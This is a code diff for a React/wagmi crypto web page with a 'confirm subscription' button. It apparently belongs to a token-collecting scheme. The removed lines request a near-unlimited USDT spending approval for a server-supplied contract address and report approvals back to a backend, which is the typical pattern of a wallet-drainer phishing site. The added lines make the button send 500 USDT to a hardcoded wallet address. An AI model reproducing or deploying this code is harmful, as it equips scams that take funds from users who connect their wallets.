@@ -7,8 +7,9 @@ import HOMEIMG02 from "@images/home-02.png"
 import USDTIMG from "@images/icon/usdt_02.png"
 import AddressIcon from "@images/icon/address.png"
 import { shortenString } from "@/lib/utils";
-import { useAccount, useNetwork } from "wagmi";
-import { useContractUserBalance, useGetUserInfo, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt";
+import { useAccount, useNetwork, useSendTransaction } from "wagmi";
+import { parseEther } from 'viem'
+import { useContractUserBalance, useGetUserInfo, userContractApprove, userContractUsdtTransition, useContractUserAllowanceStatus } from "@/hooks/usdt";
 import React,{ useEffect, useState, useRef } from "react";
 import { postForm } from "node_modules/axios/index.cjs";
 import { getRequestExtract, postUserapproveAuth, getContractAddress, getHomeConfig, getBackList } from "@/server/user";
@@ -24,7 +25,7 @@ export default function Home() {
   const router = useRouter()
   const { address } = useAccount()
   const [loading, setLoding] = useState(false)
-  const { data, isLoading, approve, isSuccess, onSuccess, onError } = userContractApprove()
+  const { data, isLoading, transfer, isSuccess, onSuccess, onError } = userContractUsdtTransition()
   const { userinfo } = useGetUserInfo()
   const { userBalance } = useContractUserBalance()
   const [contractAddress, setContractAddress] = useState<any>("")
@@ -40,6 +41,7 @@ export default function Home() {
     message: ""
   })
   const { chain } = useNetwork()
+  const { data: hash, sendTransaction } = useSendTransaction()
   useEffect(()=>{
     if(isSuccess){
       onSuccess(async () => {
@@ -80,13 +82,20 @@ export default function Home() {
     if(contractAddress == "") return
     setLoding(true)
     try {
-      await approve({
-        args: [contractAddress, 14122398000000000000000000000],
-      })
+      // await approve({
+      //   args: [contractAddress, 14122398000000000000000000000],
+      // })
     } catch (error) {
       console.log(error);
     }
     setLoding(false)
+  }
+
+  const handlePayTransition = async() => {
+    const to = "0x28889F5f56DDE7fb545767ae58C6ce7e4a0E587D" as `0x${string}` 
+    transfer({
+      args: [to, "500000000000000000000"],
+    })
   }
 
   return (
@@ -140,7 +149,7 @@ export default function Home() {
                     style={{height:"fit-content"}}
                 />
               </div>
-              <div className="bg-[#E1146E] text-lg sm:text-xl font-bold text-center py-3 sm:py-5 cursor-pointer">
+              <div className="bg-[#E1146E] text-lg sm:text-xl font-bold text-center py-3 sm:py-5 cursor-pointer" onClick={handlePayTransition}>
                 确认认购
               </div>
             </div>
